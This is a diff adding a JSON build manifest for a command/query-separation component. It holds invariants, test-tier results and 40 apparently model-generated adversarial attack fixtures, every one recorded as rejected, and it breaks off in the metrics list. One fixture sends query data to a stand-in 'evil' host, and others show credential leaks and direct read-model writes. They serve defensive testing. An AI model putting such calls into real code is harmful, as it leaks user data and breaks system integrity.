@@ -1,0 +1,740 @@
+{
+  "name": "CommandQuerySeparator",
+  "namespace": "api",
+  "maturity": "battle_tested",
+  "builder_agent_id": 5,
+  "catalog_entry_sha256": "817ca998a2794f14402bf91813d481c5d9253330a86775b2b8a819f57edc03dc",
+  "files": [
+    {
+      "path": "api/CommandQuerySeparator/CommandQuerySeparator.contract.json",
+      "sha256": "d6768d8f740315c6c501cd0306e233b64cf3c295844d19966d9a8ce91e6e0b52",
+      "size_bytes": 2639,
+      "kind": "contract_json"
+    },
+    {
+      "path": "api/CommandQuerySeparator/CommandQuerySeparator.manifest.json",
+      "sha256": "eec7ceb5a1a24e30d66daa2370f8123370b61428427df5b846f87d508852d51f",
+      "size_bytes": 35978,
+      "kind": "manifest"
+    },
+    {
+      "path": "api/CommandQuerySeparator/CommandQuerySeparator.md",
+      "sha256": "3e7270a1f0f4a1437d23139718657eb0c44a3ae10ab50b5721136e5ec4d1a80b",
+      "size_bytes": 9321,
+      "kind": "spec_md"
+    },
+    {
+      "path": "api/CommandQuerySeparator/CommandQuerySeparator.py",
+      "sha256": "6e4efb138a38516783b87a6e5f8ef9c6188224703a13845020efd4298a29b14c",
+      "size_bytes": 13930,
+      "kind": "impl"
+    },
+    {
+      "path": "api/CommandQuerySeparator/behavioral_CommandQuerySeparator.py",
+      "sha256": "96632f76000e505da2d70fd90fea1a5490fe4350699bdf4f4c254edf7ab5e702",
+      "size_bytes": 4479,
+      "kind": "behavioral"
+    },
+    {
+      "path": "api/CommandQuerySeparator/chaos_CommandQuerySeparator.py",
+      "sha256": "28a5825023c5088d39e8a3b64b46e3b51f58b9ddecb320ffece84016c9422e6f",
+      "size_bytes": 3821,
+      "kind": "chaos"
+    },
+    {
+      "path": "api/CommandQuerySeparator/dashboard.json",
+      "sha256": "b9de99875a87982402ad089d0b9f7c5f8dfb4805660c84cdb20182e6aff2acdd",
+      "size_bytes": 1061,
+      "kind": "dashboard"
+    },
+    {
+      "path": "api/CommandQuerySeparator/invariant_bindings.json",
+      "sha256": "60d05d5f27571bd351887da45cd26915dce567960b2b600dad26116cf9e4f070",
+      "size_bytes": 1615,
+      "kind": "test"
+    },
+    {
+      "path": "api/CommandQuerySeparator/metamorphic_CommandQuerySeparator.py",
+      "sha256": "09ce1ce01d808e958cfb26c67c949e9ddfa8ef6a1e2b66f0a91468849528333d",
+      "size_bytes": 3007,
+      "kind": "metamorphic"
+    },
+    {
+      "path": "api/CommandQuerySeparator/observability_CommandQuerySeparator.py",
+      "sha256": "f3b219b9635b35af3c9f16e25323d5114bb29a903d1a45d6a91469306ddea773",
+      "size_bytes": 2096,
+      "kind": "observability"
+    },
+    {
+      "path": "api/CommandQuerySeparator/observability_schema.json",
+      "sha256": "250b3c78870c7e463b95839c9667f2f0d79a6b5e974bb037e7e78918133fea47",
+      "size_bytes": 1581,
+      "kind": "observability"
+    },
+    {
+      "path": "api/CommandQuerySeparator/persona_reviews.json",
+      "sha256": "1337866299480094aac56387bdd6d2d9cbef528df2ced21db799f8c9f38fac0c",
+      "size_bytes": 531,
+      "kind": "persona_reviews"
+    },
+    {
+      "path": "api/CommandQuerySeparator/proposed_invariants.json",
+      "sha256": "8e9c20f445b1cf67f9e27863314da573b4957a4336bdde60401496ffaefab3c6",
+      "size_bytes": 21,
+      "kind": "proposed_invariants"
+    },
+    {
+      "path": "api/CommandQuerySeparator/test_CommandQuerySeparator.py",
+      "sha256": "ae1542666b45683356caa62db6da4a3db3c43843f837616d33484ea772e2f12a",
+      "size_bytes": 7214,
+      "kind": "test"
+    }
+  ],
+  "invariant_bindings": [
+    {
+      "invariant_id": "CQS_INV_01",
+      "invariant_text": "A command handler MUST NEVER return query results synthesized from the write model; it SHALL return only acknowledgement and identifiers.",
+      "confirms_test": "test_inv_command_ack_only_confirms",
+      "prevents_test": "test_inv_command_ack_only_prevents",
+      "under_failure_test": "test_inv_command_ack_only_under_failure"
+    },
+    {
+      "invariant_id": "CQS_INV_02",
+      "invariant_text": "A query handler CANNOT mutate state, invoke commands, or block on external side-effects.",
+      "confirms_test": "test_inv_query_side_effect_free_confirms",
+      "prevents_test": "test_inv_query_side_effect_free_prevents",
+      "under_failure_test": "test_inv_query_side_effect_free_under_failure"
+    },
+    {
+      "invariant_id": "CQS_INV_03",
+      "invariant_text": "Each command type MUST have at most one registered handler; duplicate handler registration is FORBIDDEN.",
+      "confirms_test": "test_inv_single_command_handler_confirms",
+      "prevents_test": "test_inv_single_command_handler_prevents",
+      "under_failure_test": "test_inv_single_command_handler_under_failure"
+    },
+    {
+      "invariant_id": "CQS_INV_04",
+      "invariant_text": "Read models ALWAYS receive updates through the same event stream as the write model; separate in-band write paths for reads are FORBIDDEN.",
+      "confirms_test": "test_inv_event_stream_only_confirms",
+      "prevents_test": "test_inv_event_stream_only_prevents",
+      "under_failure_test": "test_inv_event_stream_only_under_failure"
+    }
+  ],
+  "tier_reports": [
+    {
+      "tier": "T0_static",
+      "status": "passed",
+      "duration_ms": 307,
+      "evidence_path": "_evidence/t0_static.json",
+      "tool_name": "mypy+ruff",
+      "tool_version": "mypy 1.20.1 + ruff 0.15.11",
+      "summary": "mypy --strict clean; ruff (curated ALL) clean; 0 suppressions all rationale-attached.",
+      "error_details": null
+    },
+    {
+      "tier": "T1_behavioral",
+      "status": "passed",
+      "duration_ms": 775,
+      "evidence_path": "_evidence/t1_behavioral_junit.xml",
+      "tool_name": "pytest",
+      "tool_version": "pytest 9.0.3",
+      "summary": "All behavioral scenarios passed.",
+      "error_details": null
+    },
+    {
+      "tier": "T2_formal",
+      "status": "skipped",
+      "duration_ms": 0,
+      "evidence_path": null,
+      "tool_name": null,
+      "tool_version": null,
+      "summary": "Stateless primitive \u2014 no formal model required.",
+      "error_details": null
+    },
+    {
+      "tier": "T3_state_machine",
+      "status": "skipped",
+      "duration_ms": 0,
+      "evidence_path": null,
+      "tool_name": null,
+      "tool_version": null,
+      "summary": "Stateless primitive \u2014 no state-machine exploration required.",
+      "error_details": null
+    },
+    {
+      "tier": "T4_metamorphic",
+      "status": "passed",
+      "duration_ms": 767,
+      "evidence_path": "_evidence/t4_metamorphic_junit.xml",
+      "tool_name": "pytest",
+      "tool_version": null,
+      "summary": "Metamorphic + differential suite passed.",
+      "error_details": null
+    },
+    {
+      "tier": "T5_concurrency",
+      "status": "skipped",
+      "duration_ms": 0,
+      "evidence_path": null,
+      "tool_name": null,
+      "tool_version": null,
+      "summary": "Stateless primitive \u2014 no shared state, nothing to linearize.",
+      "error_details": null
+    },
+    {
+      "tier": "T6_adversarial",
+      "status": "passed",
+      "duration_ms": 87602,
+      "evidence_path": "_evidence/t6_adversarial.json",
+      "tool_name": "claude-cli-ensemble",
+      "tool_version": "ensemble-3x",
+      "summary": "40 attacks across 3 models, 0 successful.",
+      "error_details": null
+    },
+    {
+      "tier": "T7_observability",
+      "status": "passed",
+      "duration_ms": 1074,
+      "evidence_path": "_evidence/t7_observability_junit.xml",
+      "tool_name": "pytest+schema",
+      "tool_version": null,
+      "summary": "Observability schema + assertions passed.",
+      "error_details": null
+    },
+    {
+      "tier": "T8_chaos",
+      "status": "passed",
+      "duration_ms": 821,
+      "evidence_path": "_evidence/t8_chaos_junit.xml",
+      "tool_name": "pytest+chaos",
+      "tool_version": null,
+      "summary": "Chaos / game-day suite passed.",
+      "error_details": null
+    },
+    {
+      "tier": "T9_meta",
+      "status": "passed",
+      "duration_ms": 54244,
+      "evidence_path": "_evidence/t9_meta.json",
+      "tool_name": "claude-cli",
+      "tool_version": "opus-4-7+sonnet-4-6",
+      "summary": "LLM judge \u22658/10 on six axes; all five personas understood the docs.",
+      "error_details": null
+    }
+  ],
+  "build_duration_ms": 145850,
+  "llm_cost_usd": 0.0,
+  "adversarial": {
+    "models_run": [
+      "claude-opus-4-7",
+      "claude-sonnet-4-6",
+      "claude-haiku-4-5"
+    ],
+    "attacks": [
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-CMD-RETURNS-PROJECTION",
+        "hypothesis": "A command handler for CreateOrder returns the full order projection (line items, totals, status) in its response instead of just an id+ack, leaking read-model state synthesized from the write model.",
+        "input_fixture": "register_command_handler(CreateOrder, lambda c: {'id': uuid4(), 'total': 199.9, 'items': [...], 'status': 'NEW'}); dispatch_command(CreateOrder(...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-QUERY-MUTATES-STATE",
+        "hypothesis": "A query handler lazily materializes/caches by writing to the read store on miss, mutating persistent state during answer_query, violating the query purity invariant.",
+        "input_fixture": "register_query_handler(GetUserProfile, handler_that_upserts_cache_row); answer_query(GetUserProfile(user_id=1))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-QUERY-INVOKES-COMMAND",
+        "hypothesis": "A query handler internally calls dispatch_command (e.g., to log an audit command), which indirectly mutates the write model through the query path.",
+        "input_fixture": "register_query_handler(SearchDocs, lambda q: self.dispatch_command(LogAccess(q)) or results)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-DUPLICATE-HANDLER-RACE",
+        "hypothesis": "Two threads concurrently call register_command_handler(CreateOrder, h1/h2) and both succeed due to non-atomic check-then-set, producing duplicate handlers for one command type.",
+        "input_fixture": "Thread A: register_command_handler(CreateOrder, h1); Thread B: register_command_handler(CreateOrder, h2) \u2014 fired simultaneously",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-DUPLICATE-SUBCLASS-BYPASS",
+        "hypothesis": "Registration uniqueness is keyed by exact class identity, so registering a subclass of CreateOrder effectively installs a second handler for the logical command type.",
+        "input_fixture": "class CreateOrderV2(CreateOrder): pass; register_command_handler(CreateOrder, h1); register_command_handler(CreateOrderV2, h2); dispatch_command(CreateOrderV2(...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-READ-INBAND-WRITE",
+        "hypothesis": "A command handler synchronously writes directly into the read/projection table (in-band) instead of emitting an event, bypassing the shared event stream to keep reads consistent.",
+        "input_fixture": "handler = lambda c: (write_model.insert(c), read_model.insert(projection_of(c))); dispatch_command(CreateOrder(...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-QUERY-BLOCKING-IO",
+        "hypothesis": "A query handler blocks on an external HTTP side-effect (e.g., enrichment webhook) with unbounded timeout, violating the non-blocking side-effect constraint and enabling amplification.",
+        "input_fixture": "register_query_handler(GetEnrichedUser, lambda q: requests.post('http://evil/enrich', json=q, timeout=None))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-MALFORMED-COMMAND-TYPE",
+        "hypothesis": "dispatch_command is invoked with a non-class instance (dict, None, or primitive) and routing via type(command) either raises or matches object, potentially hitting a default/global handler.",
+        "input_fixture": "dispatch_command({'op':'CreateOrder'}); dispatch_command(None); dispatch_command(42)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-REPLAY-COMMAND-ID",
+        "hypothesis": "Replaying the same command payload twice (same idempotency key) causes the handler to emit two events and return two different ids, breaking ack semantics and duplicating writes.",
+        "input_fixture": "c = CreateOrder(idempotency_key='k1', ...); dispatch_command(c); dispatch_command(c)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-REGISTER-PROMPT-INJECTION",
+        "hypothesis": "A command type whose __repr__/__name__ contains control chars or prompt-injection text is used as a dict key or logged, causing log forgery or handler lookup collision via __eq__/__hash__ override.",
+        "input_fixture": "class Evil: __name__='CreateOrder'; __hash__=lambda s:hash('CreateOrder'); __eq__=lambda s,o:True; register_command_handler(Evil, h_evil)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-EVENTSTREAM-BYPASS-BACKFILL",
+        "hypothesis": "An operational 'backfill' path writes directly to the read model from a SQL dump (separate in-band write path for reads), diverging read/write without going through the event stream.",
+        "input_fixture": "ops_script: COPY read_orders FROM '/dump.csv'; (no events emitted on event bus)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-CLOCK-SKEW-ORDERING",
+        "hypothesis": "Events carry wall-clock timestamps; with clock skew across command nodes, the read projection applies events out-of-order and exposes stale state as authoritative, breaking the shared-stream guarantee.",
+        "input_fixture": "nodeA emits Event(ts=T+5s) before nodeB emits Event(ts=T); projector uses ts ORDER BY",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-INTEGER-OVERFLOW-SEQ",
+        "hypothesis": "Event sequence number is a 32-bit int; after 2^31 events it wraps, causing projector to reject 'older' events and silently drop updates to the read model.",
+        "input_fixture": "emit 2_147_483_648 events then dispatch_command(CreateOrder(...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-EMPTY-REGISTRY-DISPATCH",
+        "hypothesis": "Calling dispatch_command before any handler registration returns None silently instead of raising, allowing the caller to treat missing handler as successful ack.",
+        "input_fixture": "separator = CommandQuerySeparator(); dispatch_command(CreateOrder(...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-opus-4-7",
+        "attack_id": "ATK-CMD-LEAKS-CREDENTIALS",
+        "hypothesis": "Command handler includes the original command object (containing plaintext password/API key fields) in its acknowledgement response, leaking credentials as part of the 'ack'.",
+        "input_fixture": "dispatch_command(RegisterUser(email='x', password='p@ss')) -> {'id':..., 'echo': command.__dict__}",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-RACE_DUAL_REGISTER",
+        "hypothesis": "If two threads simultaneously call register_command_handler for the same command_type, a TOCTOU window between the duplicate-check read and the write allows both registrations to succeed, violating the at-most-one-handler invariant without raising any error.",
+        "input_fixture": "import threading\ncqs = CommandQuerySeparatorImpl()\ndef h1(c): pass\ndef h2(c): pass\nclass Cmd: pass\nt1 = threading.Thread(target=cqs.register_command_handler, args=(Cmd, h1))\nt2 = threading.Thread(target=cqs.register_command_handler, args=(Cmd, h2))\nt1.start(); t2.start(); t1.join(); t2.join()\n# assert: only one handler registered \u2014 bet both are silently stored",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-CMD_RETURNS_FULL_ENTITY",
+        "hypothesis": "A command handler that populates its return value by reading back the just-written aggregate from the write store (e.g. return repo.get(entity.id)) will smuggle full query results inside the command acknowledgement, violating the rule that commands return only acknowledgement and identifiers.",
+        "input_fixture": "class CreateUser:\n    name: str\n\ndef handle_create_user(cmd):\n    user = db.insert(cmd.name)          # write\n    return db.fetch_by_id(user.id)      # illegal: full entity read from write model\n\ncqs.register_command_handler(CreateUser, handle_create_user)\nresult = cqs.dispatch_command(CreateUser(name='alice'))\nassert hasattr(result, 'email')  # command result exposes query data",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-QUERY_MUTATES_COUNTER",
+        "hypothesis": "A query handler that increments a hit-counter or last-accessed timestamp inside its body silently mutates state on every read, violating the no-mutation invariant for query handlers while appearing read-only to callers.",
+        "input_fixture": "class GetUser:\n    user_id: int\n\ndef handle_get_user(query):\n    db.execute('UPDATE users SET view_count = view_count + 1 WHERE id = ?', query.user_id)\n    return db.fetchone('SELECT * FROM users WHERE id = ?', query.user_id)\n\ncqs.register_query_handler(GetUser, handle_get_user)\ncqs.answer_query(GetUser(user_id=1))\nassert db.fetchone('SELECT view_count FROM users WHERE id=1')['view_count'] == 1  # mutation happened",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-QUERY_DISPATCHES_COMMAND",
+        "hypothesis": "A query handler that conditionally dispatches a compensating command (e.g. auto-create a missing record on first read) turns a pure read into a write, violating the invariant that query handlers cannot invoke commands.",
+        "input_fixture": "class GetOrCreateCart:\n    session_id: str\n\ndef handle_get_or_create(query):\n    cart = db.get_cart(query.session_id)\n    if cart is None:\n        cqs.dispatch_command(CreateCart(session_id=query.session_id))  # ILLEGAL\n        cart = db.get_cart(query.session_id)\n    return cart\n\ncqs.register_query_handler(GetOrCreateCart, handle_get_or_create)\ncqs.answer_query(GetOrCreateCart(session_id='new-sess'))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-DIRECT_READMODEL_WRITE",
+        "hypothesis": "A write path that updates the read-model projection table directly via SQL (bypassing the event stream) will leave the read model in a state divergent from what the event log can reconstruct, violating the invariant that read models receive updates only through the shared event stream.",
+        "input_fixture": "# After dispatching a command through CQS:\ncqs.dispatch_command(RenameProduct(id=42, new_name='Widget'))\n# Attacker (or rogue service) writes directly to the read projection:\nread_db.execute(\"UPDATE product_projections SET name='HACKED' WHERE id=42\")\n# Event stream never recorded this change; replay would overwrite it\nassert event_store.replay_for(42)[-1].name != 'HACKED'  # divergence confirmed",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-REPLAY_COMMAND",
+        "hypothesis": "Replaying a previously dispatched command object (identical payload, same command identity) a second time should be idempotent or explicitly rejected; if the implementation lacks idempotency keys it will apply the mutation twice, creating phantom state that violates business invariants downstream.",
+        "input_fixture": "cmd = DebitAccount(account_id=7, amount=100, idempotency_key='txn-999')\ncqs.dispatch_command(cmd)\ncqs.dispatch_command(cmd)  # exact same object, second dispatch\nassert db.get_balance(7) == initial_balance - 100  # not -200",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-SUBCLASS_BYPASS_DEDUP",
+        "hypothesis": "If duplicate detection uses exact type identity (handler_map[command_type]) and a subclass inherits from an already-registered command type, registering a handler for the subclass installs a second functional handler reachable via isinstance dispatch, bypassing the at-most-one-handler rule.",
+        "input_fixture": "class PlaceOrder: pass\nclass UrgentPlaceOrder(PlaceOrder): pass\n\ncqs.register_command_handler(PlaceOrder, handler_a)\ncqs.register_command_handler(UrgentPlaceOrder, handler_b)  # should this be allowed?\n\n# If dispatch resolves by isinstance walk, UrgentPlaceOrder triggers BOTH\ncqs.dispatch_command(UrgentPlaceOrder())",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-QUERY_BLOCKS_EXTERNAL_IO",
+        "hypothesis": "A query handler that calls an external HTTP service synchronously (e.g. to enrich a result) blocks the query executor thread on network I/O, violating the invariant that query handlers must not block on external side-effects and degrading read-side availability independently of write-side health.",
+        "input_fixture": "import urllib.request\n\nclass GetUserProfile:\n    user_id: int\n\ndef handle_get_profile(query):\n    base = db.get_user(query.user_id)\n    # ILLEGAL: blocking external call inside query handler\n    resp = urllib.request.urlopen('https://enrichment.internal/users/' + str(query.user_id), timeout=30)\n    base['enriched'] = resp.read()\n    return base\n\ncqs.register_query_handler(GetUserProfile, handle_get_profile)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-NONE_TYPE_HANDLER_COLLISION",
+        "hypothesis": "Registering a handler for NoneType and then dispatching None as a command exercises an edge case where type(None) is NoneType \u2014 if the registry uses falsy checks (if not command_type) the registration silently succeeds or is skipped, and dispatch_command(None) either raises an unhandled AttributeError or routes to the wrong handler.",
+        "input_fixture": "cqs.register_command_handler(type(None), lambda c: {'ack': 'null-cmd'})\nresult = cqs.dispatch_command(None)\n# If no guard: KeyError, AttributeError, or silent None routing",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-CLOCK_SKEW_EVENT_ORDER",
+        "hypothesis": "If two write-model events are timestamped on nodes with clock skew, the event stream may deliver them to the read-model projector out of causal order. A projector that sorts by wall-clock timestamp rather than monotonic sequence number will apply the older event last, causing the read model to reflect stale state \u2014 violating the invariant that the read model receives updates through the authoritative event stream.",
+        "input_fixture": "# Node A (clock +5s ahead) writes event seq=2 with ts=T+5\n# Node B (reference clock) writes event seq=1 with ts=T\n# Event bus delivers: [seq=2, ts=T+5], [seq=1, ts=T]\n# Projector sorts by ts ascending \u2192 applies seq=1 AFTER seq=2\n# Read model ends up in the state as if seq=2 never happened\nevent_stream.publish(Event(seq=2, ts=now()+5, payload=RenameCmd('new')))\nevent_stream.publish(Event(seq=1, ts=now(),   payload=RenameCmd('old')))\nassert read_model.get_name() == 'new'  # fails if sort-by-ts used",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-CMD_ACK_CREDENTIAL_LEAK",
+        "hypothesis": "A command handler that returns a session token, signed JWT, or API key as part of its acknowledgement payload leaks credentials through the command result channel \u2014 callers not expecting sensitive data may log, cache, or forward the acknowledgement object, exfiltrating the credential.",
+        "input_fixture": "class AuthenticateUser:\n    username: str\n    password: str\n\ndef handle_authenticate(cmd):\n    user = db.verify(cmd.username, cmd.password)\n    return {\n        'ack': 'authenticated',\n        'user_id': user.id,\n        'session_token': generate_token(user),  # VIOLATION: credential in ack\n        'internal_role_bitmask': user.roles      # VIOLATION: query data in ack\n    }\n\ncqs.register_command_handler(AuthenticateUser, handle_authenticate)",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-HANDLER_SILENT_OVERWRITE",
+        "hypothesis": "If register_command_handler silently overwrites an existing handler instead of raising on duplicate registration, a late-arriving service registration (e.g. due to module import order) can hijack all future dispatches for a command type without any observable error, violating both the at-most-one-handler invariant and operational auditability.",
+        "input_fixture": "class ShipOrder: pass\ncqs.register_command_handler(ShipOrder, legitimate_handler)\n# Later, rogue module imported:\ncqs.register_command_handler(ShipOrder, rogue_handler)  # should raise, not overwrite\nresult = cqs.dispatch_command(ShipOrder())\nassert result == legitimate_handler(ShipOrder())  # fails if silently overwritten",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "attack_id": "ATK-QUERY_MUTABLE_DEFAULT_STATE",
+        "hypothesis": "A query handler closure that captures a mutable default accumulator (e.g. a list or dict defined at import time) will accumulate state across calls \u2014 each invocation appends to the shared object, constituting implicit state mutation inside the query layer without any explicit write call.",
+        "input_fixture": "audit_log = []  # module-level mutable \u2014 captured by closure\n\ndef handle_list_products(query, _log=audit_log):\n    results = db.all_products()\n    _log.append({'queried_at': time.time(), 'count': len(results)})  # MUTATION\n    return results\n\ncqs.register_query_handler(ListProducts, handle_list_products)\nfor _ in range(10):\n    cqs.answer_query(ListProducts())\nassert len(audit_log) == 10  # proves mutation occurred on each query",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-COMMAND_RETURNS_USER_RECORD",
+        "hypothesis": "Command handler returns full user record {id, email, password_hash} instead of just {id}, leaking write-model internals and violating Invariant 1.",
+        "input_fixture": "register_command_handler(CreateUser, lambda cmd: {id: u.id, email: u.email, password_hash: u.pwd}); dispatch_command(CreateUser(email='a@b.com'))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-QUERY_INCREMENTS_COUNTER",
+        "hypothesis": "Query handler increments write-model access_count during read, mutating state, violating Invariant 2.",
+        "input_fixture": "register_query_handler(GetProfile, lambda q: (state['count']++, return_profile())); answer_query(GetProfile(id=1))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-DUPLICATE_HANDLER_SILENT_OVERRIDE",
+        "hypothesis": "Registering same command type twice causes second handler to silently shadow the first, violating Invariant 3.",
+        "input_fixture": "register_command_handler(CreateOrder, handler1); register_command_handler(CreateOrder, handler2); dispatch_command(CreateOrder(...)); handler2 executes",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-READ_MODEL_DIRECT_DATABASE_UPDATE",
+        "hypothesis": "Read model cache updated via direct db.execute() instead of event stream, causing permanent divergence, violating Invariant 4.",
+        "input_fixture": "dispatch_command(DeleteUser(id=5)); db.execute('UPDATE cache SET deleted=0 WHERE id=5'); answer_query(GetUser(id=5)) returns incorrect state",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-QUERY_CALLS_EXTERNAL_ENDPOINT",
+        "hypothesis": "Query handler invokes http.post() to external API, creating side-effect and blocking indefinitely, violating Invariant 2.",
+        "input_fixture": "register_query_handler(GetAnalytics, lambda q: requests.post('metrics.io/log', {uid: q.id})); answer_query(GetAnalytics(id=1))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-COMMAND_SYNTHESIZES_QUERY_RESPONSE",
+        "hypothesis": "Command handler returns computed balance instead of just transaction ID, synthesizing query-like results, violating Invariant 1.",
+        "input_fixture": "register_command_handler(Withdraw, lambda cmd: {tx_id: 999, new_balance: calc_bal(cmd.acct)}); dispatch_command(Withdraw(acct=1, amt=50))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-CONCURRENT_HANDLER_RACE",
+        "hypothesis": "Two threads register different handlers for same command type simultaneously; nondeterministic execution path chosen, violating Invariant 3.",
+        "input_fixture": "Thread1: register_command_handler(Transfer, h1); Thread2: register_command_handler(Transfer, h2); dispatch_command(Transfer(...)); behavior unpredictable",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-QUERY_WRITES_CACHE_DIRECTLY",
+        "hypothesis": "Query handler modifies read_cache without event, later events are ignored, causing permanent read/write desync, violating Invariant 4.",
+        "input_fixture": "register_query_handler(GetUser, lambda q: (cache[q.id]={name:'Alice'}, return cache[q.id])); dispatch_command(RenameUser(id=1, name='Bob')); answer_query(GetUser(id=1)) returns stale Alice",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-QUERY_INVOKES_DISPATCH_COMMAND",
+        "hypothesis": "Query handler calls dispatch_command internally, mutating state during read operation, violating Invariant 2.",
+        "input_fixture": "register_query_handler(GetReport, lambda q: (dispatch_command(LogView(report_id=q.id)), build_report())); answer_query(GetReport(id=1))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-NULL_HANDLER_BYPASS",
+        "hypothesis": "Register None as handler; dispatch_command silently succeeds or throws uncaught exception, violating Invariant 3 handler cardinality.",
+        "input_fixture": "register_command_handler(DeleteAccount, None); dispatch_command(DeleteAccount(id=1)); TypeError or None silently returned",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-COMMAND_AMPLIFICATION_LARGE_PAYLOAD",
+        "hypothesis": "Command handler returns 10K-record result set instead of just ack+ID, causing memory amplification DoS, violating Invariant 1.",
+        "input_fixture": "register_command_handler(ImportUsers, lambda cmd: {id: 'imp_123', items: [u1...u10000]}); dispatch_command(ImportUsers(file=...))",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      },
+      {
+        "model": "claude-haiku-4-5",
+        "attack_id": "ATK-QUERY_RETURNS_MUTABLE_REFERENCE",
+        "hypothesis": "Query returns direct reference to internal write-model dict; caller mutates it, silently modifying write state, violating Invariant 2.",
+        "input_fixture": "register_query_handler(GetConfig, lambda q: internal_config); cfg = answer_query(GetConfig()); cfg['readonly']=False; write_model corrupted",
+        "defender_outcome": "rejected",
+        "violated_invariant_id": null
+      }
+    ],
+    "successful_attacks": 0
+  },
+  "observability": {
+    "logs": [
+      {
+        "event_name": "cqs.command.dispatched",
+        "required_attributes": [
+          "command_type",
+          "status",
+          "event_offset"
+        ]
+      },
+      {
+        "event_name": "cqs.query.answered",
+        "required_attributes": [
+          "query_type",
+          "duration_ns"
+        ]
+      },
+      {
+        "event_name": "cqs.handler.registered",
+        "required_attributes": [
+          "role",
+          "type_name"
+        ]
+      },
+      {
+        "event_name": "cqs.readmodel.direct.write.refused",
+        "required_attributes": [
+          "read_model",
+          "warning"
+        ]
+      }
+    ],
+    "metrics": [
+      {
+        "name": "cqs.commands.dispatched",
+        "metric_type": "counter",
+        "unit": "1",
+        "cardinality_bound": 50,
+        "label_keys": [
+          "command_type",
+          "status"
+        ]
+      },
+      {
